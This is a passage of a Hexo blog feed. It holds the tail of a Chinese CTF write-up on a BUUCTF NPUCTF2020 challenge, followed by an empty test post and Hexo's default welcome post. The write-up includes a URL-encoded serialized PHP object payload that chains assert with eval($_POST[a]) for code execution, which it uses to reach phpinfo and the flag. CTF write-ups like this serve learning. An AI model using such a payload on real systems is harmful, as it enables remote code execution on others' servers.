class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">function barber($type)&#123;</span><br><span class="line">    echo &quot;you wanted a $type haircut, no problem\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func(&#39;barber&#39;,&#39;mushroom&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">&#x2F;&#x2F;返回内容如下：</span><br><span class="line">&#x2F;&#x2F;you wanted a mushroom haircut, no problem</span><br></pre></td></tr></table></figure><p>只要构造出<strong>call_user_func(phpinfo)</strong>就好了</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data&#x3D;O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</span><br></pre></td></tr></table></figure><p>成功得出结果：</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200124220-346066862.png" alt=""></p><p>flag就在phpinfo中</p><p><img src="https://img2020.cnblogs.com/blog/2015024/202004/2015024-20200423200413520-1487498985.png" alt=""><br>得到flag！</p><p><strong>未完待续···</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;BUUCTF-NPUCTF2020&quot;&gt;&lt;a href=&quot;#BUUCTF-NPUCTF2020&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF[NPUCTF2020]&quot;&gt;&lt;/a&gt;BUUCTF[NPUCTF2020]&lt;/h1&gt;&lt;p&gt;上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>test</title>
    <link href="http://yoursite.com/2020/05/28/test/"/>
    <id>http://yoursite.com/2020/05/28/test/</id>
    <published>2020-05-27T18:24:05.000Z</published>
    <updated>2020-05-27T18:24:05.543Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/05/28/hello-world/"/>
    <id>http://yoursite.com/2020/05/28/hello-world/</id>
    <published>2020-05-27T18:22:14.688Z</published>
    <updated>2020-07-20T10:31:56.764Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
